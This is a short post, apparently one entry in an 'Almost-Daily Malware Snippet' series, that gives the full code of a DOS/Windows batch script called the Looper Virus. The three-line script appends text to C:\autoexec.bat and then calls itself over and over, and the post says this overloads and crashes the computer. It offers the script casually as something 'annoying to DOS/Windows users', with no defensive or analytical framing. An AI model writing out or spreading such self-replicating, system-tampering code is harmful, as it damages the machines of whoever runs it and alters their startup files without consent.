@@ -1,0 +1,10 @@
+Almost-Daily Malware Snippet: The Looper Virus
+
+The Looper Virus is more of a fork bomb really. It overloads the system and crashes the computer (DOS and Windows only!) 
+Here's its code: 
+
+@echo off 
+echo echo Ctrl-er >> C:\autoexec.bat 
+%0 
+
+It's super simple but can be annoying to DOS/Windows users!
